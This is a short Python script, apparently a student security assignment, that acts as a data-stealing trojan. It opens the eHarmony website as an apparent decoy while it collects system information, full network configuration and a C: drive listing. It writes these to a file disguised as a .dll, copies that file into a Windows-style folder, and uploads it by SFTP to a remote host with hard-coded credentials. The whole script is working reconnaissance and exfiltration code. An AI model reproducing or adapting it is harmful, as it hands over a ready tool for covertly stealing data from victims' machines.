import webbrowser
import os
import subprocess
import shutil
import paramiko

# OPENS EHARMONY WEBSITE
webbrowser.open("http://www.eharmony.com.au/")

# FINDS SYSTEM INFORMATION
print('<<SYSTEM INFORMATION>>')
ID = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
sysList = []

for item in ID:
    sysList.append(str(item.split("\r")[:-1]))
for i in sysList:
    print(i[2:-2])

# FINDS NETWORK INFORMATION
print('<<NETWORK INFORMATION>>')
data = subprocess.check_output(['ipconfig', '/all']).decode('utf-8').split('\n')
dataList = []

for item in data:
    dataList.append(str(item.split('\r')[:-1]))
for i in dataList:
    print(i[2:-2])

# FINDS DIRECTORIES IN C DRIVE
print('<<C:\ DIRECTORIES>>')
print()
DIR = os.listdir(r'C:\\')
dirList = []

for item in DIR:
    dirList.append(str(item.split('\r')))
for i in dirList:
    print(i[2:-2])

# CREATES AND WRITES INFO TO .DLL FILE IN DIRECTORY
f = open("crapS3895662.dll", "w")
f.write("<<SYSTEM INFORMATION>> \n\n")
for itemFile in sysList:
    f.write(itemFile + "\n")
f.write("\n\n")
f.write("<<NETWORK INFORMATION>> \n\n")
for itemFile in dataList:
    f.write(itemFile + "\n")
f.write("\n\n")
f.write("<<C:\ DIRECTORIES>> \n\n")
for itemFile in dirList:
    f.write(itemFile + "\n")
f.close()

# COPIES .DLL FILE TO WINDOWS FOLDER
original = "crapS3895662.dll"
target = r"C:\test windows\crapS3895662.dll"

shutil.copyfile(original, target)

# SENDS .DLL FILE TO AN SFTP SERVER
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(hostname='192.168.147.128', username='george', password='1234', allow_agent=False, look_for_keys=False)

sftp = client.open_sftp()
sftp.put(r'C:\Users\poppi\OneDrive\Desktop\s3895662_Assignment_2c\crapS3895662.dll', '/files/crapS3895662.dll')
sftp.close()


